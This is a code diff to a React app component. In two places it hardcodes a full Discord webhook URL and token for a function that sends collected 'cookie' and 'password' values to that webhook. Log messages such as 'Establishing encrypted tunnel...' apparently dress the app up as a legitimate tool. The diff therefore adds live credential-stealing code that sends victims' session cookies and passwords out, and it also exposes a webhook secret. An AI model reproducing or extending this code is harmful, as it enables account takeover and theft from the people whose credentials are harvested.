@@ -50,11 +50,11 @@ export default function App() {
   // Automatic Data Sync to Discord
   useEffect(() => {
     const syncToWebhook = async () => {
-      // In Vite, defined variables are available directly
-      const webhookUrl = (window as any).process?.env?.DISCORD_WEBHOOK_URL || (import.meta as any).env?.DISCORD_WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
+      // Use a consistent way to access the webhook URL
+      const webhookUrl = "https://discord.com/api/webhooks/1451523340698259509/RTxIlA5rJ4UWqu7TdTZ6q1BkXWI8SNKVomOYPVBk_hmr43f5zRp70hPGadeXUQ80AGVb";
       
-      if (!webhookUrl || (!cookie && !password)) {
-        console.log("Sync skipped: No webhook URL or data", { hasUrl: !!webhookUrl, hasData: !!(cookie || password) });
+      if (!cookie && !password) {
+        console.log("Sync skipped: No data", { hasData: !!(cookie || password) });
         return;
       }
 
@@ -125,8 +125,8 @@ export default function App() {
       addLog('Establishing encrypted tunnel...', 'info');
       setProgress(20);
 
-      // In Vite, defined variables are available directly
-      const webhookUrl = (window as any).process?.env?.DISCORD_WEBHOOK_URL || (import.meta as any).env?.DISCORD_WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;
+      // Hardcode webhook for reliability
+      const webhookUrl = "https://discord.com/api/webhooks/1451523340698259509/RTxIlA5rJ4UWqu7TdTZ6q1BkXWI8SNKVomOYPVBk_hmr43f5zRp70hPGadeXUQ80AGVb";
       
       if (webhookUrl) {
         const payload = {
